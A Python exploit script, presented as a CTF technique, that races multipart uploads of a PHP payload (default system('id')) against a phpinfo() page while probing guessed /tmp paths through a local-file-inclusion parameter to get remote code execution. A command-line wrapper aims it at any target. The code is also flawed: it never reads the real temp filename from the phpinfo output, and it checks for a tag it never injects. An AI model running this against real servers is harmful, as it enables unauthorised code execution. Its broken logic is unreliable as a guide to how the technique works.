# -*- coding: utf-8 -*-
"""PHPInfo LFI Race Condition — PHP 5.x file upload + LFI via /tmp.

Classic CTF technique: when you have LFI but no file upload,
use PHP's phpinfo() page which lists temporary uploaded files.
Race condition: upload a PHP shell while phpinfo() shows temp path.
"""

from __future__ import annotations
import sys
import threading
import time

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


def phpinfo_lfi_race(
    phpinfo_url: str,
    lfi_url: str,
    lfi_param: str = "file",
    php_code: str = '<?php system("id"); ?>',
    threads: int = 20,
    timeout: int = 30,
    verbose: bool = True,
) -> str | None:
    """Attempt PHPInfo LFI race condition attack.

    Args:
        phpinfo_url: URL of phpinfo() page
        lfi_url: URL with LFI, e.g. 'http://site/index.php?page='
        lfi_param: The LFI parameter name
        php_code: PHP code to execute on target
        threads: Number of concurrent upload threads
        timeout: Max seconds to run

    Returns flag/data or None.
    """
    if not HAS_REQUESTS:
        print("[!] requests module required. Install: pip install requests")
        return None

    import random
    tag = f"YANGWEB{random.randint(1000, 9999)}"

    php_payload = php_code.encode() if isinstance(php_code, str) else php_code

    stop_event = threading.Event()
    found = [None]

    def upload_worker():
        session = _requests.Session()
        payload = (
            f"------WebKitFormBoundary\r\n"
            f"Content-Disposition: form-data; name=\"file\"; filename=\"shell_{threading.get_ident()}.php\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + php_payload + b"\r\n------WebKitFormBoundary--\r\n"

        headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"}

        while not stop_event.is_set():
            try:
                session.post(phpinfo_url, data=payload, headers=headers, timeout=3)
            except Exception:
                pass

    def lfi_worker():
        session = _requests.Session()
        while not stop_event.is_set() and found[0] is None:
            try:
                # Brute tmp files
                for i in range(100):
                    path = f"/tmp/php{i:02x}{i:02x}"
                    url = f"{lfi_url}?{lfi_param}={path}" if "?" not in lfi_url else f"{lfi_url}&{lfi_param}={path}"
                    resp = session.get(url, timeout=2)
                    if tag in resp.text or "uid=" in resp.text:
                        found[0] = resp.text
                        stop_event.set()
                        return
                time.sleep(0.1)
            except Exception:
                pass

    if verbose:
        print(f"Target phpinfo: {phpinfo_url}")
        print(f"Target LFI:    {lfi_url}?{lfi_param}=<tmpfile>")
        print(f"Threads:       {threads}")
        print(f"Timeout:       {timeout}s\n")
        print("Starting race condition...")

    workers = []
    for _ in range(threads // 2):
        workers.append(threading.Thread(target=upload_worker, daemon=True))
    for _ in range(threads // 2):
        workers.append(threading.Thread(target=lfi_worker, daemon=True))

    for w in workers:
        w.start()

    time.sleep(timeout)
    stop_event.set()

    for w in workers:
        w.join(timeout=2)

    if found[0]:
        if verbose:
            print("\n[+] RCE achieved!")
            print(found[0][:500])
        return found[0]
    else:
        if verbose:
            print("\n[-] Race condition failed. Try:")
            print("  1. Increase threads")
            print("  2. Verify phpinfo() is accessible")
            print("  3. Confirm LFI path is correct")
            print("  4. Check PHP version (best with PHP 5.x)")
        return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python phpinfo_lfi.py <phpinfo_url> <lfi_url> [--param file] [--threads 20]")
        print("Example: python phpinfo_lfi.py http://site/phpinfo.php 'http://site/index.php'")
        sys.exit(0)

    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    phpinfo_url = sys.argv[1]
    lfi_url = sys.argv[2]
    param = sys.argv[4] if len(sys.argv) > 4 and sys.argv[3] == "--param" else "file"
    threads = int(sys.argv[6]) if len(sys.argv) > 6 and sys.argv[5] == "--threads" else 20

    result = phpinfo_lfi_race(phpinfo_url, lfi_url, lfi_param=param, threads=threads)
